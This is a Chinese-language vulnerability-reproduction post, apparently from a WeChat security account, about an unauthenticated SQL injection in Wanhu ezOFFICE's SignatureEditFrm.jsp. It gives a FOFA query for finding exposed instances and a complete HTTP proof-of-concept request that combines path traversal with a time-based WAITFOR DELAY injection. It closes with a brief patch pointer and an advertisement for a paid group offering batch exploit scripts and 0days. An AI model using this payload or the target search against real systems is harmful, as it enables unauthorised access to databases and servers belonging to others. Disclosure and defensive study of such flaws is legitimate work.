#  「漏洞复现」万户 ezOFFICE SignatureEditFrm.jsp SQL注入漏洞   
冷漠安全  冷漠安全   2024-11-04 19:56  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
**0x01 免责声明**  
  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
万户OA ezoffice是万户网络协同办公产品多年来一直将主要精力致力于中高端市场的一款OA协同办公软件产品，统一的基础管理平台，实现用户数据统一管理、权限统一分配、身份统一认证。统一规划门户网站群和协同办公平台，将外网信息维护、客户服务、互动交流和日常工作紧密结合起来，有效提高工作效率。  
  
0x03  
  
**漏洞威胁**  
  
万户 ezOFFICE SignatureEditFrm.jsp接口存在SQL注入漏洞，未授权的攻击者可利用此漏洞获取数据库权限，深入利用可获取服务器权限。  
  
0x04  
  
**漏洞环境**  
  
FOFA:  
```
app="万户网络-ezOFFICE"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qFET1iaVDPfwljkwTs0zCah57tAoS1UVGr87mCwKVPYjibr5OxvkZnWdtvcKiaqNVEdYnoHiatoqPYXw/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
**漏洞复现**  
  
PoC  
```
GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iWebRevision.jsp/Signature/SignatureEditFrm.jsp?SignatureID=1;WAITFOR%20DELAY%20%270:0:4%27-- HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```  
  
延时  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qFET1iaVDPfwljkwTs0zCahBtgVEYEn1TfmMpNoeyQjhTQkBlw4jC6mkvJWFbel9XH9d3XciblPsuQ/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qFET1iaVDPfwljkwTs0zCahQNaA8DbdPUN4aegmPeblwUicVneQZHtfiby5WhCfj9jAIGrxzGyUDTnA/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
**修复建议**  
  
厂商已提供漏洞修补方案，请关注厂商主页及时更新：   
  
http://www.whir.net/  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qFET1iaVDPfwljkwTs0zCahA9vTrtMvHYurKbiaSt1krtWQHGzORlQRVT1wrXgMxXKm75PjJAmbXuw/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0qFET1iaVDPfwljkwTs0zCah1edkznSw9mkT7z2B84qLlXdYeR9Mehd2Nb1kHTF7e5NeKqEgXpozAA/640?wx_fmt=gif&from=appmsg "")  
  
  
